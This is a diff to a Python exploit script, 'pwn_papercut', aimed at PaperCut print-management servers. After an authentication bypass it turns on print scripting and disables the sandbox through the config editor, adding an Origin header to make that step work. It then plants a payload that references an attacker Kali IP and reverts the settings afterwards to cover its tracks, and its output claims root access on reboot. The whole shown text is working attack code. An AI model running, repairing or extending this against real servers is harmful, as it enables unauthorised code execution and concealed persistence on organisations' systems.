@@ -28,21 +28,24 @@ def pwn_papercut(target, kali_ip):
         return
     print("[+] Auth bypass successful!")
 
-    # Disable sandbox & enable scripting (broken)
-    # NOTE: BROKEN. Word niet omgezet...
+    # Disable sandbox & enable scripting 
     for setting, value in [('print-and-device.script.enabled', 'Y'), ('print.script.sandboxed', 'N')]:
         print(f"[*] Updating config: {setting} -> {value}")
+        headers = {'Origin': f'{base_url}'}
         s.post(f"{base_url}/app", data={
-            'service': 'direct/1/ConfigEditor/quickFindForm', 'sp': 'S0',
-            'Form0': '$TextField,doQuickFind,clear', '$TextField': setting, 'doQuickFind': 'Go'
-        }, verify=False)
+            'service': 'direct/1/ConfigEditor/quickFindForm', 
+            'sp': 'S0',
+            'Form0': '$TextField,doQuickFind,clear', 
+            '$TextField': setting, 
+            'doQuickFind': 'Go'
+        }, headers=headers, verify=False)
         
         s.post(f"{base_url}/app", data={
             'service': 'direct/1/ConfigEditor/$Form', 'sp': 'S1',
             'Form1': '$TextField$0,$Submit,$Submit$0', 
             '$TextField$0': value, 
             '$Submit$0': 'Update'
-        }, verify=False)
+        }, headers=headers, verify=False)
 
     # Discovery
     r_list = s.get(f"{base_url}/app?service=page/PrinterList", verify=False)
@@ -82,8 +85,27 @@ def pwn_papercut(target, kali_ip):
 
     r_final = s.post(f"{base_url}/app", data=post_data, verify=False)
 
+    # Revert setting changes
+    for setting, value in [('print-and-device.script.enabled', 'N'), ('print.script.sandboxed', 'Y')]:
+        print(f"[*] Reverting config: {setting} -> {value}")
+        headers = {'Origin': f'{base_url}'}
+        s.post(f"{base_url}/app", data={
+            'service': 'direct/1/ConfigEditor/quickFindForm', 
+            'sp': 'S0',
+            'Form0': '$TextField,doQuickFind,clear', 
+            '$TextField': setting, 
+            'doQuickFind': 'Go'
+        }, headers=headers, verify=False)
+        
+        s.post(f"{base_url}/app", data={
+            'service': 'direct/1/ConfigEditor/$Form', 'sp': 'S1',
+            'Form1': '$TextField$0,$Submit,$Submit$0', 
+            '$TextField$0': value, 
+            '$Submit$0': 'Update'
+        }, headers=headers, verify=False)
+
     if "Saved successfully" in r_final.text:
-        print("[+] SUCCESS: Exploit chain deployed!")
+        print("[+] SUCCESS: Exploit chain deployed! Root access will be granted on reboot.")
     elif kali_ip in r_final.text:
         print("[+] SUCCESS: Payload verified in response! Check UI.")
     else:
